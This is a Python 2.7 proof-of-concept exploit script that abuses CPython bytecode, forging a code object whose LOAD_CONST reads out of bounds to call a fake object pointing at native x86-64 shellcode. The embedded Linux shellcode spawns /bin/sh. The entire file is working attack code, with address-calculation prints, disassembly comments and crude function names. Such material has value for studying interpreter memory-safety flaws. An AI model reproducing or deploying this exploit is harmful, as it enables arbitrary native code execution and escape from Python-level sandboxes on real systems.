#!/usr/bin/env python
# -*- coding: utf-8 -*-

import struct
import types
import opcode
import platform
import sys
from ctypes import c_char

def get_string_object_padding():
    """
    Find at runtime the padding PyStringObject -> PyStringObject.ob_sval:
        typedef struct {        +
            PyObject_VAR_HEAD   |
            long ob_shash;      | We want to know that size
            int ob_sstate;      |
            char ob_sval[1];    +
        } PyStringObject;
    """
    marker = 'ABCDEFGH'
    r = (c_char * 100).from_address(id(marker))
    return r.raw.find(marker)

def pack_ushort(us):
    return struct.pack('<H', us)

def pack_uint(ui):
    return struct.pack('<Q', ui)

def get_opcode(o):
    return chr(opcode.opmap[o])

def exec_x86_shellcodes_via_python27_opcodes_(addr_x86_code):
    """Execute native x86 code abusing the Python VM"""

    def pull_the_trigger_b1tch():
        """Pull the trigger motherfucker"""
        pass

    padding_size = get_string_object_padding()
    const_tuple = ()
    addr_const_tuple = id(const_tuple)
    print 'addr_const_tuple: ' + hex(addr_const_tuple)

    first_indirection = 'A' * 0x40 + pack_uint(addr_x86_code) # ¿?
    addr_first_indirection = id(first_indirection)
    addr_first_indirection_controled_data = addr_first_indirection + padding_size
    print 'addr_first_indirection_controled_data: ' + hex(addr_first_indirection_controled_data)

    fake_object = 'AAAA' + pack_uint(addr_first_indirection_controled_data) # ¿?
    addr_fake_object = id(fake_object)
    addr_fake_object_controled = addr_fake_object + padding_size
    print 'addr_fake_object_controled: ' + hex(addr_fake_object_controled)

    ptr_object = pack_uint(addr_fake_object_controled)
    addr_ptr_object = id(ptr_object)
    addr_ptr_data_controled = addr_ptr_object + padding_size
    print 'addr_ptr_data_controled: ' + hex(addr_ptr_data_controled)

    # Compute the offset
    # Remember:
    # 1E01138D    8B7C99 0C       MOV EDI,DWORD PTR [EBX*4+ECX+0C] ; ECX is the address of the const_tuple object, EBX you control!
    assert((addr_ptr_data_controled - addr_const_tuple - 0xC) % 4 == 0)

    #offset = ((addr_ptr_data_controled - addr_const_tuple - 0xC) & 0xffffffffffffffff) / 4 # ¿?
    # ghidra
    # In LOAD_CONST:
    # CPU Disasm
    #    001f5988 4d 8b 64        MOV        R12,qword ptr [R14 + RDX*0x8 + 0x18]
    #    001f598d 4d 8d 73 08     LEA        R14,[R11 + 0x8]
    #    001f5991 49 83 04        ADD        qword ptr [R12],0x1
    #    001f5996 4d 89 23        MOV        qword ptr [R11],R12
    offset = ((addr_const_tuple - addr_ptr_data_controled - 0x18) & 0xffffffffffffffff) / 0x8 # mio
    #offset = ((addr_ptr_data_controled - addr_const_tuple - 0x18) & 0xffffffffffffffff) / 0x8 # mio
    offset_high, offset_low = offset >> 16, offset & 0xffff

    # 1. Load the low part of our address
    evil_bytecode  = get_opcode('EXTENDED_ARG') + pack_ushort(offset_high)
    # 2. Load an object from the const: This is an evil object :]
    evil_bytecode += get_opcode('LOAD_CONST') + pack_ushort(offset_low)
    # 3. Call the function on the top of stack: The evil function object :]
    evil_bytecode += get_opcode('CALL_FUNCTION') + '\x00\x00'

    pull_the_trigger_b1tch.func_code = types.CodeType(
        0,
        0,
        0,
        0,
        evil_bytecode,
        const_tuple,
        (),
        (),
        "",
        "",
        0,
        ""
    )

    print 'triggering bug...'
    pull_the_trigger_b1tch()

def main(argc, argv):
    sh = None
    system = platform.system()

    if system == 'Linux':
        # Execute /bin/sh - 27 bytes
        sh = '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'
    else:
        sh = '\xcc'

    address_shellcode = id(sh) + get_string_object_padding()
    exec_x86_shellcodes_via_python27_opcodes_(address_shellcode)

if __name__ == '__main__':
    sys.exit(main(len(sys.argv), sys.argv))
